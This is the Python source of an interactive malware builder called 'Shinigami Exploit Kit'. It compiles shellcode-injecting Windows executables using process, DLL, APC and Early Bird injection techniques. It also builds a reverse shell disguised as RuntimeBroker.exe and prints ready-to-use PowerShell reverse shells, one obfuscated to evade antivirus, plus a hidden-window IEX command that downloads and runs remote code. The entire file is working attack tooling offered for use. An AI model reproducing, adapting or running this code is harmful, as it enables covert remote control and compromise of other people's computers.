from cmd import Cmd
import os
from termcolor import colored
import fileinput
import time
import sys



class MyPrompt(Cmd):
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
    if len(sys.argv) >= 2 and len(sys.argv) < 7:
        print("usage : For Handler Mode -> python3 THE-SEK.py\n        For Cli Mode -> python3 THE-SEK.py <ip> <port> <exe/powershell> <if ps : staged/stageless else : stageless> <if staged webdelivery path (example shini/shinigami.exe)> <AMSI/AV Bypass true/false> ")
        quit()
    elif len(sys.argv) == 7:
        Cmd.ip = sys.argv[1]
        Cmd.port = sys.argv[2]
        Cmd.file_type = sys.argv[3]
        Cmd.staged_stageless = sys.argv[4]
        Cmd.web_delivery = sys.argv[5]
        Cmd.amsi_av = sys.argv[6]
        if Cmd.file_type == 'exe':
            with open("./malware/XX-C2/info", "w") as file1:
                file1.write('#define HOST "' + Cmd.ip + '"\n#define PORT ' + Cmd.port)

            with open("./malware/XX-C2/info", "r") as f:
                data = f.read()

            os.system("cp ./malware/XX-C2/sakito_revshell.c ./malware/XX-C2/nani.c")

            for line in fileinput.FileInput("./malware/XX-C2/nani.c",inplace=1):
                if "IP_PORT" in line:
                    line=line.replace(line,data)
                print(line, end=" ")
            os.system("i686-w64-mingw32-gcc ./malware/XX-C2/nani.c ./malware/XX-C2/lib/windows/sakito_win_core.c -o ./ready/RuntimeBroker.exe -s -ffunction-sections -fdata-sections -fno-exceptions -fmerge-all-constants -static-libgcc -lws2_32 -D PORT=" + Cmd.port + " -D HOST=" + Cmd.ip)
            os.system("rm ./malware/XX-C2/nani.c")
            quit()
        elif Cmd.file_type == 'powershell':
            if Cmd.staged_stageless == 'stageless':
                print(colored("[+]", 'cyan') + ' Your Payload Is Ready To Use : $client = New-Object System.Net.Sockets.TCPClient("' + Cmd.ip + '",' + Cmd.port + ');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()')
                quit()
            elif Cmd.staged_stageless == 'staged':
                print(colored("[+]", 'cyan') + """ Your Payload Is Ready To Use : powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://""" + Cmd.ip + """:""" + Cmd.port +  """/""" + Cmd.web_delivery + """'))""""")
                quit()
            else:
                print ("invalid arguments")
                quit()

         
    elif len(sys.argv) == 1:
        Cmd.ip = input("[+] Provide Your Ip To (THE-SEK) : ")
        Cmd.port = input("[+] Provide Your Port To (THE-SEK) : ")
    
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
    Cmd.ip_array = [char for char in Cmd.ip]
    prompt = colored('( ' + Cmd.ip + ':' + Cmd.port + ' THE-SEK) > ', 'red')
    intro = "=========================================================================\n[THE-SEK] Shinigami Exploit Kit\n=========================================================================\n[Version] 0.1 Beta\n=========================================================================" + colored("""

              ___           _,.---,---.,_
              |         ,;~'             '~;, 
              |       ,;                     ;,      
     Frontal  |      ;                         ; ,--- Supraorbital Foramen
      Bone    |     ,'                         /'
              |    ,;                        /' ;,
              |    ; ;      .           . <-'  ; |
              |__  | ;   ______       ______   ;<----- Coronal Suture
             ___   |  '/~"     ~" . "~     "~\'  |
             |     |  ~  ,-~~~^~, | ,~^~~~-,  ~  |
   Maxilla,  |      |   |        }:{        | <------ Orbit
  Nasal and  |      |   l       / | \       !   |
  Zygomatic  |      .~  (__,.--" .^. "--.,__)  ~. 
    Bones    |      |    ----;' / | \ ';-<--------- Infraorbital Foramen
             |__     \__.       \/^\/       .__/
                ___   V| \                 / |V <--- Mastoid Process
                |      | |T~\___!___!___/~T| |
                |      | |'IIII_I_I_I_IIII'| |  
       Mandible |      |  \,III I I I III,/  | 
                |       \   \'~~~~~~~~~~'    /
                |         \   .       . <-x---- Mental Foramen
                |__         \.    ^    ./
                              ^~~~^~~~^
""", 'green') + colored("""
             _______ _    _ ______    _____ ______ _  __
            |__   __| |  | |  ____|  / ____|  ____| |/ /
               | |  | |__| | |__    | (___ | |__  | ' / 
               | |  |  __  |  __|    \___ \|  __| |  <  
               | |  | |  | | |____   ____) | |____| . \ 
               |_|  |_|  |_|______| |_____/|______|_|\_\\
      
""", 'red') + """
      
                   """ + colored("11", 'cyan') + """ Diffrent Types Of Malware
                   """ + colored("0", 'cyan') + """ Diffrent Types Of Ransomware [ToDo]
                   """ + colored("0", 'cyan') + """ Diffrent Types Of Rootkits [ToDO]
                   """ + colored("3", 'cyan') + """ Diffrent Type Of Powershell Scripts
"""



    def do_use(self, type):
        '''Using the Handler'''
        if type == '':
            print("""
""" + colored("""[*]""" ,'cyan')+ """ Using The Handler
""" + colored("""[+]""" ,'cyan') + """ Choose The Tpe You Wank To Use (example, use malware)

""" + colored("""[1]""" ,'cyan') + """ malware
""" + colored("""[2]""" ,'cyan') + """ ransomeware [ToDo]
""" + colored("""[3]""" ,'cyan') + """ rootkit [ToDo]
""" + colored("""[4]""" ,'cyan') + """ powershell
""" + colored("""[5]""" ,'cyan') + """ reverseshell
""" + colored("""[6]""" ,'cyan') + """ payload
""")

        elif type == 'malware':
            print("""
""" + colored("""[*]""" ,'cyan')+ """ Using Malware Handler
""" + colored("""[+]""" ,'cyan') + """ Choose The Malware You Want To Generate

""" + colored("""[1]""" ,'cyan') + """ Self Inject To .Data Section
""" + colored("""[2]""" ,'cyan') + """ Self Inject To .TEXT Section
""" + colored("""[3]""" ,'cyan') + """ Self Inject To .RSRC Section
""" + colored("""[4]""" ,'cyan') + """ Shellcode Injection To a Remote Process
""" + colored("""[5]""" ,'cyan') + """ Simple Dll Injection
""" + colored("""[6]""" ,'cyan') + """ Simple Hidding Some Functions Self Inject
""" + colored("""[7]""" ,'cyan') + """ No Imports Technique
""" + colored("""[8]""" ,'cyan') + """ Thread Context Injection
""" + colored("""[9]""" ,'cyan') + """ Section And Views Injection
""" + colored("""[10]""" ,'cyan') + """ Asynchronous Procedure Calls Injection
""" + colored("""[11]""" ,'cyan') + """ Early Bird Technique (thanks to tupi)
""" + colored("""[12]""" ,'cyan') + """ Custom Malware
""" + colored("""[13]""" ,'cyan') + """ Enviroment Variable Injection (thanks to naser niknam) [ToDo]
""")
            Cmd.malware_type = input(colored("[*]", 'cyan') + " Enter The Number For The Malware Type You Want To Use : ")
            print(colored("[*]", 'cyan') + " Using Malware Type " + Cmd.malware_type )
            if Cmd.malware_type == '4' or Cmd.malware_type == '8' or Cmd.malware_type == '9' or Cmd.malware_type == '10':
                Cmd.target_process = input(colored("[*]", 'cyan') + " Specify The Target Process To Inject To (example explorer.exe) (avoid using background processes like svchost.exe) : ")
                Cmd.target_process = 'pid = FindTarget("' + Cmd.target_process + '");'

        elif type == 'rasnomeware':
            print(colored("[-]", 'red') + " Not Implemented yet Come Back Later :D\n")
        elif type == 'rootkit':
            print(colored("[-]", 'red') + " Not Implemented yet Come Back Later :D\n")
        elif type == 'powershell':
            print("""
""" + colored("""[*]""" ,'cyan')+ """ Using powershell Handler
""" + colored("""[+]""" ,'cyan') + """ Choose The Powershell You Want To Generate

""" + colored("""[1]""" ,'cyan') + """ Staged With IEX (No AV Bypass)
""" + colored("""[2]""" ,'cyan') + """ Stageless (No AV Bypass)
""" + colored("""[3]""" ,'cyan') + """ Staged With IEX (AV Bypass) [ToDo]
""" + colored("""[4]""" ,'cyan') + """ Stageless (AV Bypass) [ToDo]
""")
            Cmd.powershell_type = input(colored("[*]", 'cyan') + " Enter The Number For The Powershell Type You Want To Use : ")
            if Cmd.powershell_type == '1':
                Cmd.web_delivery = input(colored("[*]", 'cyan') + " Enter Your WebDelivery Payload Name : ")
                print(colored("[*]", 'cyan') + " Using Powershell Type " + Cmd.powershell_type )
            elif Cmd.powershell_type == '2':
                print(colored("[*]", 'cyan') + " Using Powershell Type " + Cmd.powershell_type )

        elif type == 'reverseshell':
            print("reverse")
        elif type == 'payload':
            print("""
""" + colored("""[*]""" ,'cyan')+ """ Using Payload Handler
""" + colored("""[+]""" ,'cyan') + """ Choose Your Payload Type

""" + colored("""[1]""" ,'cyan') + """ HEX
""" + colored("""[2]""" ,'cyan') + """ RAW Bin File
""" + colored("""[3]""" ,'cyan') + """ calc-thread 64 bit (for testing)
""" + colored("""[4]""" ,'cyan') + """ calc-thread 32 bit (for testing)
""")
            Cmd.payload_type = input(colored("[*]", 'cyan') + " Enter The Number For The Payload Type You Want To Use : ")
            if Cmd.payload_type == '1':
                Cmd.payload_hex = input(colored("[*]", 'cyan') + " Please Parse Your Payload Like So : { 0x40, 0x40 ,...}; : ")
                print (colored("[+]",'cyan') + " Using Payload Type " + Cmd.payload_type + "\n")
            elif Cmd.payload_type == '2':
                Cmd.payload_bin = input(colored("[*]", 'cyan') + " Please Provide The Path To Bin file : ")
                print (colored("[+]",'cyan') + " Using Payload Type " + Cmd.payload_type + "\n")
            elif Cmd.payload_type == '3':
                print (colored("[+]",'cyan') + " Using Payload Type " + Cmd.payload_type + "\n")
            elif Cmd.payload_type == '4':
                print (colored("[+]",'cyan') + " Using Payload Type " + Cmd.payload_type + "\n")
            else:
                print (colored("[-]" , 'red') + " Wrong Number\n")

    def do_generate(self, generate):
        '''generates your malware'''
        if generate == 'powershell':
            if Cmd.powershell_type == '1':
                print(colored("[+]", 'cyan') + """ Your Payload Is Ready To Use : powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://""" + Cmd.ip + """:""" + Cmd.port +  """/""" + Cmd.web_delivery + """'))""""")
            elif Cmd.powershell_type == '2':
                print(colored("[+]", 'cyan') + ' Your Payload Is Ready To Use : $client = New-Object System.Net.Sockets.TCPClient("' + Cmd.ip + '",' + Cmd.port + ');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()')
            elif Cmd.powershell_type == '4':
                print(colored("[+]", 'cyan') + ' Your Payload Is Ready To Use : sEt 9MNCZ2  (  [TypE]("{2}{1}{4}{0}{3}" -f\'CodI\',\'XT.\',\'TE\',\'ng\',\'eN\')  ) ;  ${c`lIe`NT} = .("{1}{0}{2}"-f \'c\',\'New-Obje\',\'t\') ("{0}{5}{7}{3}{2}{6}{1}{4}{8}"-f \'Sy\',\'T\',\'k\',\'oc\',\'CPCl\',\'stem.Net\',\'ets.\',\'.S\',\'ient\')(("{0}{3}{2}{1}" -f change >> \'1\',\'21\',\'52.\',\'72.21.\'),9002);${st`RE`Am} = ${c`l`iENT}.("{1}{0}{2}" -f \'Stre\',\'Get\',\'am\').Invoke();[byte[]]${B`yTeS} = 0..65535|&(\'%\'){0};while((${i} = ${S`TR`eam}.("{0}{1}"-f\'R\',\'ead\').Invoke(${B`ytES}, 0, ${b`YTEs}."le`Ng`TH")) -ne 0){;${DA`Ta} = (.("{2}{1}{0}" -f\'t\',\'jec\',\'New-Ob\') -TypeName ("{1}{5}{6}{0}{2}{4}{3}"-f \'t.ASCI\',\'Syst\',\'IEnco\',\'g\',\'din\',\'em.\',\'Tex\'))."GE`TsTr`ING"(${B`yt`Es},0, ${i});${S`EnDBA`ck} = (.("{1}{0}"-f \'x\',\'ie\') ${Da`TA} 2>&1 | &("{0}{1}{2}"-f\'O\',\'ut-Stri\',\'ng\') );${sEND`B`AcK2} = ${SendB`A`ck} + "PS " + (&("{1}{0}" -f\'wd\',\'p\'))."pA`Th" + "> ";${sEND`BY`Te} = (  ( ls  VARIablE:9mNCZ2).VAluE::"asc`iI").("{0}{2}{1}"-f\'Get\',\'es\',\'Byt\').Invoke(${se`Nd`BaCk2});${sT`RE`Am}.("{1}{0}" -f\'rite\',\'W\').Invoke(${s`eNDb`YTE},0,${S`END`B`Yte}."len`G`Th");${s`TR`Eam}.("{0}{1}"-f \'F\',\'lush\').Invoke()};${CL`IEnT}.("{0}{1}" -f \'Cl\',\'ose\').Invoke()')
        elif generate == 'malware':
            if Cmd.payload_type == '':
                print(colored("[-]", 'red') + "Please Set The Payload First\n")
            elif Cmd.malware_type == '':
                print(colored("[-]", 'red') + "Please Set The Malware Type\n")
            elif Cmd.malware_type == '6':
                os.system("cp ./malware/0" + Cmd.malware_type + "-malware/malware" + Cmd.malware_type + ".cpp ./malware/0" + Cmd.malware_type + "-malware/" + Cmd.malware_type + ".cpp")
                os.system("mv ./malware/0" + Cmd.malware_type + "-malware/malware" + Cmd.malware_type + ".cpp ../")
                with open("./malware/xx-shellcodes/payload" + Cmd.payload_type + ".pay", "r") as f:
                    data = f.read()
                for line in fileinput.FileInput("./malware/0" + Cmd.malware_type + "-malware/" + Cmd.malware_type + ".cpp",inplace=1):
                    if "PAYLOAD_GOES_HERE" in line:
                        line=line.replace(line,data)
                    print(line, end=" ")
                os.system("x86_64-w64-mingw32-g++ ./malware/0"+ Cmd.malware_type  + "-malware/*.cpp -fpermissive -o ./ready/shinigami.exe")
                os.system("rm ./malware/0" + Cmd.malware_type + "-malware/" + Cmd.malware_type + ".cpp")
                os.system("mv ../malware6.cpp ./malware/0" + Cmd.malware_type + "-malware/")
                print (colored("[+]" , 'cyan' ) + " Your Malware is Ready in [ready folder]" )
            elif Cmd.malware_type == '7':
                os.system("cp ./malware/0" + Cmd.malware_type + "-malware/malware" + Cmd.malware_type + ".cpp ./malware/0" + Cmd.malware_type + "-malware/" + Cmd.malware_type + ".cpp")
                Cmd.location = input(colored("[+]", 'cyan') + "Set The Location Of The Process You Want To Invoke (example c:\\\Temp\\\shinigami.exe) This is Used for persistence : ")
                for line in fileinput.FileInput("./malware/0" + Cmd.malware_type + "-malware/" + Cmd.malware_type + ".cpp",inplace=1):
                    if "LOCATION" in line:
                        line=line.replace(line,"\"" + Cmd.location + "\",")
                    print(line, end=" ")
                os.system("mv ./malware/0" + Cmd.malware_type + "-malware/malware" + Cmd.malware_type + ".cpp ../")
                os.system("x86_64-w64-mingw32-g++ ./malware/0"+ Cmd.malware_type  + "-malware/*.cpp -fpermissive -o ./ready/shinigami.exe")
                os.system("rm ./malware/0" + Cmd.malware_type + "-malware/" + Cmd.malware_type + ".cpp")
                os.system("mv ../malware7.cpp ./malware/0" + Cmd.malware_type + "-malware/")
                print (colored("[+]" , 'cyan' ) + " Your Malware is Ready in [ready folder]" )

            elif Cmd.malware_type == '3':
                os.system("cp " + Cmd.payload_bin + " ./malware/03-malware/calc.ico")
                os.system("cp ./malware/0" + Cmd.malware_type + "-malware/malware" + Cmd.malware_type + ".cpp ./malware/0" + Cmd.malware_type + "-malware/" + Cmd.malware_type + ".cpp")
                os.system("windres ./malware/0" + Cmd.malware_type + "-malware/resources.rc -O coff ./malware/0" + Cmd.malware_type + "-malware/resources.res")
                os.system("x86_64-w64-mingw32-g++ ./malware/0"+ Cmd.malware_type  + "-malware/" + Cmd.malware_type + ".cpp ./malware/0"+ Cmd.malware_type  + "-malware/resources.res -fpermissive -o ./ready/shinigami.exe")
                os.system("rm ./malware/0" + Cmd.malware_type + "-malware/" + Cmd.malware_type + ".cpp")
                print (colored("[+]" , 'cyan' ) + " Your Malware is Ready in [ready folder]" )
            else:
                os.system("cp ./malware/0" + Cmd.malware_type + "-malware/malware" + Cmd.malware_type + ".cpp ./malware/0" + Cmd.malware_type + "-malware/" + Cmd.malware_type + ".cpp")
                with open("./malware/xx-shellcodes/payload" + Cmd.payload_type + ".pay", "r") as f:
                    data = f.read()
                

                for line in fileinput.FileInput("./malware/0" + Cmd.malware_type + "-malware/" + Cmd.malware_type + ".cpp",inplace=1):
                    if "TARGET_PROCESS" in line:
                        line=line.replace(line,Cmd.target_process)
                    print(line, end=" ")

                for line in fileinput.FileInput("./malware/0" + Cmd.malware_type + "-malware/" + Cmd.malware_type + ".cpp",inplace=1):
                    if "PAYLOAD_GOES_HERE" in line:
                        line=line.replace(line,data)
                    print(line, end=" ")

                print (colored("[+]" , 'cyan' ) + " Your Malware is Ready in [ready folder]" )

                os.system("x86_64-w64-mingw32-g++ ./malware/0"+ Cmd.malware_type  + "-malware/" + Cmd.malware_type + ".cpp -fpermissive -o ./ready/shinigami.exe")
                os.system("rm ./malware/0" + Cmd.malware_type + "-malware/" + Cmd.malware_type + ".cpp")
                


    def do_exit(self, inp):
        '''exit the application.'''
        print("Bye")
        return True
    
if __name__ == '__main__':
    Cmd.malware_type = ''
    Cmd.payload_type = ''
    MyPrompt().cmdloop()
